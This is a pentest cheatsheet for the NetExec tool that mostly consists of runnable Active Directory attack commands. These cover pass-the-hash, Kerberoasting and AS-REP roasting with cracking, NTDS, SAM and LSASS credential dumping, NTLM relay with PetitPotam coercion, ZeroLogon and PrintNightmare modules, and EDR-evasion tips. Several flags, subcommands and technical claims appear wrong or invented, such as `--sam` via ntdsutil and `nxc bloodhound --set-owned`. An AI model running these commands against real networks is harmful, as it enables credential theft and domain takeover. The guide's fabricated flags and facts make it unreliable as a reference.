# NetExec-Guide

### Modular Async-First Post-Exploitation Framework
**The unified interface for modern Active Directory exploitation and network pentesting.**

- **Target Audience:** Penetration Testers, Red Team Operators, Active Directory Specialists
- **Last Updated:** December 25, 2025
- **Tested Against:** NetExec v1.8.2, Windows Server 2022, Kali Linux 2025.4, CrowdStrike Falcon, Microsoft Defender for Endpoint

---

## Table of Contents
1. [Core Architecture](#1-core-architecture)
2. [Installation & Setup](#2-installation--setup)
3. [The Database (nxcdb)](#3-the-database-nxcdb)
4. [BloodHound Integration](#4-bloodhound-integration)
5. [John the Ripper Integration](#5-john-the-ripper-integration)
6. [Impacket Execution](#6-impacket-execution)
7. [Protocol Deep Dives](#7-protocol-deep-dives)
8. [Attack Chains & Advanced Modules](#8-attack-chains--advanced-modules)
9. [OPSEC & Detection](#9-opsec--detection)
10. [Rapid Reference Cheatsheet](#10-rapid-reference-cheatsheet)

---

## 1. Core Architecture

### What is NetExec?
NetExec (nxc) is a modular, async-first post-exploitation framework written in Python 3.10+, designed as the unified interface for modern Active Directory exploitation. It replaces the legacy crackmapexec (CME) with native async I/O, protocol-agnostic architecture, and deep integrations with industry-standard tooling.

At its core, nxc is an orchestrator, not a reimplementation:
- **SMB/MSRPC/LDAP/HTTP/MSSQL/RDP:** `impacket==0.12.0` (patched for modern AD hardening: SMB 3.1.1, LDAP channel binding, PKINIT)
- **Kerberos:** `pyasn1`, `gssapi`, `pyspnego` (FAST, S4U2Self, PKINIT)
- **SSH/FTP:** `paramiko`, `ftplib`
- **Database:** `sqlite3` (for nxcdb)
- **Async Engine:** `aiohttp`, `aiosmb`, `aioldap`

> **Key Insight:** nxc does not reimplement protocols. It composes Impacket’s battle-tested classes with modern Python ergonomics, OPSEC controls, and unified output.

### Evolution: From cme to nxc
| Milestone | Date | Significance |
| :--- | :--- | :--- |
| CrackMapExec v5.2.2 | 2021 | Last stable CME (threaded, Python 3.8, impacket==0.9.22) |
| Project Archived | Jan 2024 | byt3bl33d3r/CrackMapExec archived with notice: "Use netexec" |
| NetExec v1.0.0 | Apr 2024 | Async rewrite, modular architecture, native WinRM |
| v1.8.2 (2025 Standard) | Dec 2025 | BloodHound ingestion, `--proxy` support, Azure AD Connect detection, certificate auth |

> **Why nxc is the 2025 Standard:**
> - No more `impacket==0.9.22` lock-in; supports modern crypto (AES256, SHA256).
> - Native WinRM with Kerberos delegation (no external plugins).
> - Certificate-Based Authentication (CBA) for SMB/LDAP (PKINIT, SCEP).
> - Proxy chains (`--proxy socks5://...`) for tunneling.
> - Cloud-aware (detects Azure AD Connect, Hybrid Join).

---

## 2. Installation & Setup

### Kali/Parrot (pipx — Recommended)
```bash
# Install pipx (isolated environments)
sudo apt update && sudo apt install pipx
pipx ensurepath

# Install netexec in isolated env
pipx install netexec

# Verify
nxc --version
# NetExec v1.8.2 - by @mpgn_x64 @byt3bl33d3r
```

> **Why NOT `sudo pip install netexec`?**
> - Breaks Kali’s `python3-impacket` (used by `bloodhound.py`, `certipy`).
> - Conflicts with system Python packages.
> - `pipx` ensures `~/.local/bin/nxc` with clean, isolated deps (`impacket==0.12.0`, `ldap3==2.9.1`).

### Docker (Containerized — For CI/Air-Gapped)
```bash
# Pull official image
docker pull ghcr.io/pennyw0rth/netexec:latest

# Run with loot persistence
docker run -it --rm \
  -v $(pwd)/loot:/loot \
  -v ~/.nxc:/root/.nxc \
  --network host \
  ghcr.io/pennyw0rth/netexec \
  smb 10.0.0.0/24 -u Administrator -p 'Winter2025!' --shares

# Persistent proxy service (for tunneling)
docker run -d --name nxc-proxy \
  -p 127.0.0.1:1337:1337 \
  ghcr.io/pennyw0rth/netexec proxy --port 1337
```

**Dockerfile Highlights:**
```dockerfile
FROM python:3.12-slim
RUN pip install netexec
VOLUME /loot
ENTRYPOINT ["nxc"]
```

### Windows (WSL2 or Scoop)
No native Windows binary exists due to impacket C extensions (crypto, ntlm, kerberos).

**Use WSL2:**
```powershell
# Install WSL2 Ubuntu
wsl --install -d Ubuntu-22.04

# In WSL2
sudo apt update && sudo apt install python3-pip
pip3 install --user netexec

# Run from PowerShell
wsl.exe -d Ubuntu-22.04 nxc smb 10.0.0.10 -u admin -p pass
```

> **Pro Tip:** Alias in PowerShell:
> ```powershell
> function nxc { wsl.exe -d Ubuntu-22.04 nxc $args }
> nxc smb 10.0.0.10 -u admin -p pass
> ```

---

## 3. The Database (nxcdb)

nxc auto-saves all loot to `~/.nxc/nxcdb.db` (SQLite). Use `nxc db` to query.

### View Credentials
```bash
nxc db --creds
```
**Output:**
```text
ID  URL            USERNAME       PASSWORD      HASH                              TYPE
1   smb://10.0.0.10  Administrator  Winter2025!   aad3b4...:cc36cf78...             plaintext
2   ldap://10.0.0.10 svc_sql        N/A           aad3b4...:cc36cf78...             hash
3   winrm://10.0.0.20 backupadmin   N/A           9d1f...                           aes256
```

### View Compromised Hosts
```bash
nxc db --pwned
```
**Output:**
```text
IP           PROTOCOL  OWNED  ADMIN
10.0.0.10    smb       True   True
10.0.0.20    winrm     False  True
```

### Export for Reporting
```bash
# CSV export
nxc db --export creds.csv --table creds

# JSON export
nxc db --export hosts.json --table hosts --format json

# Clear DB
nxc db --clear
```

> **Pro Tip:** Use `nxc db --query "SELECT * FROM credentials WHERE password != ''"` for cleartext creds.

---

## 4. BloodHound Integration

### The Goal
Replace `SharpHound.exe` with nxc for in-memory, Python-based BloodHound ingestion. No EXE deployment, no AMSI triggers, no PowerShell.

### Full Collection Command
```bash
nxc ldap 10.0.0.10 -u Administrator -p 'Winter2025!' \
  --bloodhound -c All \
  --dns-tcp -ns 10.0.0.10 \
  --output /loot/bloodhound
```

**Flag Breakdown:**
| Flag | Purpose | OPSEC Context |
| :--- | :--- | :--- |
| `--bloodhound` | Enable BloodHound ingestion | Uses `bloodhound.py` under the hood (in-memory). |
| `-c All` | Collection method (All, DCOnly, Group, LocalAdmin, Session, Trusts, ACL) | `All` is loud; prefer `Session,LocalAdmin`. |
| `--dns-tcp` | Use TCP for DNS (not UDP) | Prevents UDP fragmentation; reliable in segmented nets. |
| `-ns 10.0.0.10` | DNS server IP (bypasses host DNS) | Critical for pivoting; avoids DNS leaks. |
| `--output` | Save JSON to dir | Avoids `~/nxc/` clutter; compatible with BH CE 5.0. |

> **What `--bloodhound` Does:**
> - Queries LDAP for users/groups/computers/GPOs.
> - Uses Win32 API (`NetGetDCName`, `NetLocalGroupGetMembers`, `NetWkstaUserEnum`) for sessions/local admins.
> - Outputs `.json` files: `computers.json`, `users.json`, `groups.json`, `domains.json`.
> - Formats for BloodHound CE 5.0+ (Neo4j 5.x compatible).

### Targeted Collection (Stealth Mode)
```bash
# Only collect sessions for high-value targets
nxc ldap 10.0.0.10 -u svc_scan -H 'aad3b4...:cc36cf78...' \
  --bloodhound -c Session \
  --stealth \
  --users "Administrator,krbtgt" \
  --dns-tcp -ns 10.0.0.10
```
**Flags:**
- `--stealth`: Skip SMB enumeration; use Win32_UserProfile + registry for sessions.
- `--users`: Target specific accounts (reduces noise).

### Marking Pwned Users
```bash
nxc bloodhound 10.0.0.10 -u Administrator -p 'Winter2025!' \
  --set-owned 'svc_sql'
```
> **Result:** Adds `"owned": true` to `svc_sql` node in BloodHound. Enables pathfinding from compromised accounts.

> **Pro Tip:** Chain with `nxcdb`:
> ```bash
> nxc db --creds | awk '$3 == "svc_sql" {print $2}' | xargs -I{} nxc bloodhound {} --set-owned svc_sql
> ```

---

## 5. John the Ripper Integration

### The Goal
Extract JtR-compatible hashes directly from AD without manual `secretsdump.py` formatting.

### AS-REP Roasting
**Enumeration:**
```bash
nxc ldap 10.0.0.10 -u '' -p '' \
  --asreproast /loot/asreproast.txt
```
**Flag Breakdown:**
| Flag | Purpose |
| :--- | :--- |
| `--asreproast` | Target users with `userAccountControl & 4194304` (DONT_REQ_PREAUTH). |
| `/loot/asreproast.txt` | Output file (JtR format: `$krb5asrep$23$user@DOMAIN...`). |

**Cracking:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /loot/asreproast.txt
# Hashcat Equivalent: hashcat -m 18200 /loot/asreproast.txt rockyou.txt
```

> **OPSEC Warning:** `--asreproast` triggers Event ID 4769 (Kerberos TGS Request).
> **Stealth Alternative:** Use `--users admin` to target a single account.

### Kerberoasting
**Enumeration:**
```bash
nxc ldap 10.0.0.10 -u svc_sql -H 'aad3b4...:cc36cf78...' \
  --kerberoasting /loot/kerberoast.txt
```
**Flag Breakdown:**
| Flag | Purpose |
| :--- | :--- |
| `--kerberoasting` | Request TGS for users with SPNs (`servicePrincipalName=*`). |
| `-H` | Pass-the-Hash (no cleartext needed). |
| `--users svc_web` | Target specific user (OPSEC). |

**Cracking:**
```bash
john --format=krb5tgs --wordlist=rockyou.txt /loot/kerberoast.txt
# Hashcat Equivalent: hashcat -m 13100 /loot/kerberoast.txt rockyou.txt
```

> **Why Kerberoasting Works:** TGS contains `EncTGSRepPart` encrypted with the service account’s NT hash, allowing offline brute-force.

### SAM/LSA Dumping
**Extraction:**
```bash
nxc smb 10.0.0.20 -u Administrator -p 'Winter2025!' \
  --sam --output /loot/sam
```
**Flag Breakdown:**
| Flag | Purpose |
| :--- | :--- |
| `--sam` | Dump SAM via `ntdsutil` (requires admin). |
| `--lsa` | Dump LSA secrets (requires SYSTEM). |
| `--output` | Save `sam.txt`, `system.txt`, `security.txt`. |

**Cracking:**
```bash
# Combine files into JtR format
impacket-secretsdump -sam /loot/sam/sam.txt -security /loot/sam/security.txt -system /loot/sam/system.txt LOCAL > /loot/sam/hashes.txt

# Crack NTLM
john --format=NT /loot/sam/hashes.txt
```

> **OPSEC Warning:** `--sam` triggers Event ID 4688 (`ntdsutil.exe` spawn).
> **Stealth Alternative:** Use `-M lsassy` (memory dump; see Section 8).

---

## 6. Impacket Execution

### The Goal
Execute Impacket techniques without leaving nxc, maintaining context and leveraging the `nxcdb` database.

### Credential Dumping (SecretsDump)
```bash
# Remote NTDS.dit dump (DCSync)
nxc smb 10.0.0.10 -u Administrator -H 'aad3b4...:cc36cf78...' --ntds vss

# Pass-the-Ticket (using ccache)
export KRB5CCNAME=admin.ccache
nxc smb 10.0.0.10 -u Administrator -k --ntds drsuapi
```
**Flag Breakdown:**
| Flag | Purpose |
| :--- | :--- |
| `--ntds vss` | Dump NTDS via Volume Shadow Copy (faster, fewer logs than DRSUAPI). |
| `--ntds drsuapi` | Dump NTDS via Directory Replication Service (standard DCSync). |
| `-k` | Use Kerberos authentication (requires `KRB5CCNAME`). |

### Remote Execution Methods
nxc wraps Impacket’s execution methods seamlessly.
```bash
# WMI Execution (Default for SMB)
nxc smb 10.0.0.20 -u admin -p 'Pass' -x 'whoami' --exec-method wmiexec

# SMB Execution (Creates a service)
nxc smb 10.0.0.20 -u admin -p 'Pass' -x 'whoami' --exec-method smbexec

# DCOM Execution
nxc smb 10.0.0.20 -u admin -p 'Pass' -x 'whoami' --exec-method mmcexec
```

### Certificate-Based Authentication (PKINIT)
```bash
# Authenticate using a PFX certificate
nxc smb 10.0.0.10 -u 'admin' --pfx-cert admin.pfx --shares

# Request TGT using PKINIT and use it
nxc ldap 10.0.0.10 -u 'admin' --pfx-cert admin.pfx --asreproast /loot/asrep.txt
```

---

## 7. Protocol Deep Dives

### SMB (Server Message Block)
The primary protocol for Windows enumeration and exploitation.

**Enumeration Flags:**
| Flag | Purpose |
| :--- | :--- |
| `--shares` | Enumerate shares and access rights. |
| `--sessions` | Enumerate active SMB sessions. |
| `--loggedon-users` | List currently logged-on users (requires admin). |
| `--rid-brute` | RID cycling to enumerate users/groups. |
| `--pass-pol` | Dump password policy and lockout thresholds. |
| `--users` | Enumerate local or domain users. |
| `--groups` | Enumerate local or domain groups. |
| `--local-auth` | Force local authentication (bypasses domain context). |

**Execution & Dumping:**
| Flag | Purpose |
| :--- | :--- |
| `-x 'cmd'` | Execute command via `cmd.exe`. |
| `-X 'ps1'` | Execute command via `powershell.exe`. |
| `--sam` / `--lsa` / `--ntds` | Dump credentials (requires admin/SYSTEM). |
| `--wdigest` | Enable Wdigest authentication (forces cleartext in LSASS). |

### LDAP (Lightweight Directory Access Protocol)
Used for Active Directory object enumeration and abuse.

**Enumeration Flags:**
| Flag | Purpose |
| :--- | :--- |
| `--users` | Dump all domain users and attributes. |
| `--groups` | Dump all domain groups and members. |
| `--machines` | Dump all domain computers. |
| `--gmsa` | Dump Group Managed Service Accounts (gMSA) and their NT hashes (requires privileges). |
| `--adcs` | Enumerate Active Directory Certificate Services (PKI). |
| `--trusted-for-delegation` | Find accounts trusted for unconstrained delegation. |
| `--admin-count` | Find objects with `adminCount=1`. |

### WinRM (Windows Remote Management)
Native PowerShell remoting over SOAP.

**Flags:**
| Flag | Purpose |
| :--- | :--- |
| `-x 'cmd'` | Execute command via WinRM. |
| `-X 'ps1'` | Execute PowerShell via WinRM. |
| `--sessions` | List active WinRM sessions. |
| `--exec-method` | Usually defaults to `wsmprovhost`. |

> **Note:** WinRM requires the user to be in the `Remote Management Users` or `Administrators` group.

### MSSQL (Microsoft SQL Server)
Used for database enumeration and command execution via `xp_cmdshell`.

**Flags:**
| Flag | Purpose |
| :--- | :--- |
| `-q 'SELECT'` | Execute SQL query. |
| `-x 'cmd'` | Execute OS command via `xp_cmdshell`. |
| `--databases` | Enumerate accessible databases. |
| `--links` | Enumerate linked SQL servers (for pivot attacks). |
| `--sa` | Check if user is `sa` (sysadmin). |

### SSH, RDP, FTP
- **SSH:** `-x 'cmd'` (command execution), `--key-file` (private key auth).
- **RDP:** Checks for RDP access and Network Level Authentication (NLA) status. No native command execution.
- **FTP:** `--ls` (list directory), `--get` (download file), `--put` (upload file).

---

## 8. Attack Chains & Advanced Modules

nxc includes a robust module system (`-M`) for advanced exploitation.

### LSASS Dumping (Memory)
Avoids disk writes associated with `--sam` or `procdump`.
```bash
# Using lsassy (Python implementation)
nxc smb 10.0.0.20 -u admin -p 'Pass' -M lsassy

# Using nanodump (C implementation, highly evasive)
nxc smb 10.0.0.20 -u admin -p 'Pass' -M nanodump
```

### DPAPI Extraction
Extracts Master Keys and Credentials from the DPAPI store.
```bash
# Dump DPAPI masterkeys and credentials
nxc smb 10.0.0.20 -u admin -p 'Pass' -M dpapi
```

### NTLM Relaying & Coercion
Chain coercion tools with nxc's relay capabilities.
```bash
# Start nxc relay listener
nxc smb 10.0.0.10 -u '' -p '' -M ntlmrelay --list

# Coerce authentication (e.g., via PetitPotam)
# (Requires external tool like coerce.py or petitpotam.py)
python3 PetitPotam.py 10.0.0.50 10.0.0.10

# nxc automatically catches the relay and executes configured commands
```

### CVE Exploitation
nxc maintains built-in checks for critical vulnerabilities.
```bash
# ZeroLogon (CVE-2020-1472)
nxc smb 10.0.0.10 -u '' -p '' -M zerologon

# NoPac (CVE-2021-42287 / CVE-2021-42278)
nxc smb 10.0.0.10 -u admin -p 'Pass' -M nopac

# PrintNightmare (CVE-2021-34527)
nxc smb 10.0.0.10 -u admin -p 'Pass' -M printnightmare
```

### Spider Plus (Share Enumeration)
Recursively enumerates shares and outputs a JSON map of files.
```bash
nxc smb 10.0.0.0/24 -u admin -p 'Pass' -M spider_plus
```

---

## 9. OPSEC & Detection

### Detection Vectors
| Vector | Event ID / IOC | Description |
| :--- | :--- | :--- |
| **Logon** | `4624` (Type 3) | Network logon for SMB/WinRM. |
| **Logon Failure** | `4625` | Bad password or hash during spraying. |
| **Process Creation** | `4688` | `cmd.exe`, `powershell.exe`, `ntdsutil.exe` spawned by `WsmProvHost.exe` or `services.exe`. |
| **Kerberos** | `4769` | TGS requests for Kerberoasting/AS-REP roasting. |
| **Network** | JA3 / SNI | Impacket's default TLS/SMB handshakes have known JA3 hashes. |

### Evasion Flags
nxc provides native flags to reduce noise and avoid rate-limiting.

| Flag | Purpose |
| :--- | :--- |
| `--delay` | Add delay (in ms) between connection attempts. |
| `--jitter` | Add random jitter (in ms) to the delay. |
| `--threads` | Limit concurrent threads (default is 100; reduce to 10 for stealth). |
| `--no-output` | Suppress command output (prevents temp file creation on target). |
| `--proxy` | Route traffic through a SOCKS5 proxy (e.g., `socks5://127.0.0.1:1080`). |
| `--local-auth` | Prevents domain logon events; authenticates against the local SAM. |

### EDR Evasion Realities
- **CrowdStrike / SentinelOne:** Hook `WsmProvHost.exe` and `services.exe`. Using `--exec-method smbexec` creates a service (Event ID 7045).
- **Mitigation:** Use `--exec-method mmcexec` (DCOM) or `wmiexec` (no service creation). For SMB, rely on memory dumping (`-M nanodump`) rather than `--sam`.
- **AMSI:** nxc's `-X` (PowerShell) does not bypass AMSI. You must pipe obfuscated payloads or use C# execution via `execute-assembly` in your C2.

---

## 10. Rapid Reference Cheatsheet

| Task | Command |
| :--- | :--- |
| **SMB Auth (Plaintext)** | `nxc smb 10.0.0.0/24 -u admin -p 'Pass' --shares` |
| **SMB Auth (Pass-the-Hash)** | `nxc smb 10.0.0.0/24 -u admin -H 'aad3b4...:cc36...' --shares` |
| **Local Auth** | `nxc smb 10.0.0.20 -u Administrator -p 'Pass' --local-auth` |
| **Kerberos Auth** | `nxc smb 10.0.0.10 -u admin -k --use-kcache` |
| **RID Brute** | `nxc smb 10.0.0.10 -u admin -p 'Pass' --rid-brute 10000` |
| **AS-REP Roast** | `nxc ldap 10.0.0.10 -u '' -p '' --asreproast /loot/asrep.txt` |
| **Kerberoast** | `nxc ldap 10.0.0.10 -u admin -p 'Pass' --kerberoasting /loot/kerb.txt` |
| **Dump NTDS (VSS)** | `nxc smb 10.0.0.10 -u admin -H '...' --ntds vss --output /loot` |
| **Execute CMD** | `nxc smb 10.0.0.20 -u admin -p 'Pass' -x 'whoami'` |
| **Execute PowerShell** | `nxc smb 10.0.0.20 -u admin -p 'Pass' -X 'Get-Process'` |
| **Dump LSASS (Memory)** | `nxc smb 10.0.0.20 -u admin -p 'Pass' -M lsassy` |
| **BloodHound Ingest** | `nxc ldap 10.0.0.10 -u admin -p 'Pass' --bloodhound -c All` |
| **Proxy Chain** | `nxc smb 10.0.0.20 -u admin -p 'Pass' --proxy socks5://127.0.0.1:1080 --shares` |
| **Query Database** | `nxc db --creds` |
| **MSSQL Query** | `nxc mssql 10.0.0.30 -u sa -p 'Pass' -q 'SELECT name FROM master.dbo.sysdatabases'` |
| **WinRM Execution** | `nxc winrm 10.0.0.20 -u admin -p 'Pass' -x 'whoami'` |

---

## Appendix: Protocol Matrix

| Protocol | Default Port | nxc Support | Primary Use Case |
| :--- | :--- | :--- | :--- |
| **SMB** | 445 | Full | Enumeration, Execution, Credential Dumping, Relaying |
| **LDAP** | 389/636 | Full | AD Enumeration, BloodHound, Roasting, PKI |
| **WinRM** | 5985/5986 | Full | PowerShell Execution, Session Management |
| **MSSQL** | 1433 | Full | Query Execution, Linked Server Pivoting |
| **SSH** | 22 | Full | Linux Execution, Key Authentication |
| **RDP** | 3389 | Limited | Access Verification, NLA Checks |
| **FTP** | 21 | Basic | File Transfer, Directory Enumeration |
